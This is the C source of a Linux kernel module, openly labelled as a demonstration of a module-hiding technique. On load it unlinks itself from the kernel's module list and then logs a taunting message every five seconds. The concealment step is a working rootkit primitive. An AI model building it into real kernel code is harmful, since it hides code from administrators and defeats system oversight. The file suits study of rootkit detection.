#include<linux/module.h>
#include<linux/init.h>
#include<linux/sched.h>
#include<linux/oom.h>
#include<linux/timer.h>


struct timer_list callme;
static int wakeup_counter = 0;

void mockery(struct timer_list *x) {

        pr_info("[iamhiding] The sleeping giant is up now: Wake count: %d\n", ++wakeup_counter);

        mod_timer(&callme, jiffies + msecs_to_jiffies(5000));

}


static int __init my_init(void) {

        struct module *current_module = THIS_MODULE;

        pr_info("[iamhiding] Module started ... Let's hide\n");

        // Basic hiding technique .. unlink from module list 
        // A lot more can be done to obfuscate presence 

        mutex_lock(&module_mutex);
        list_del(&current_module->list);
        mutex_unlock(&module_mutex);

        pr_info("[iamhiding] Ok, I am hidden now!\n");

        timer_setup(&callme, mockery, 0);

        pr_info("[iamhiding] I will be back every 5 seconds! Find me :) \n");
        mod_timer(&callme, jiffies + msecs_to_jiffies(5000));

        return 0;

}


static void __exit my_exit(void) {

        del_timer(&callme);

        pr_info("[iamhiding] Exiting ...\n");

}

module_init(my_init);
module_exit(my_exit);

MODULE_AUTHOR("VIVEK");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Simple Module Hiding Technique");
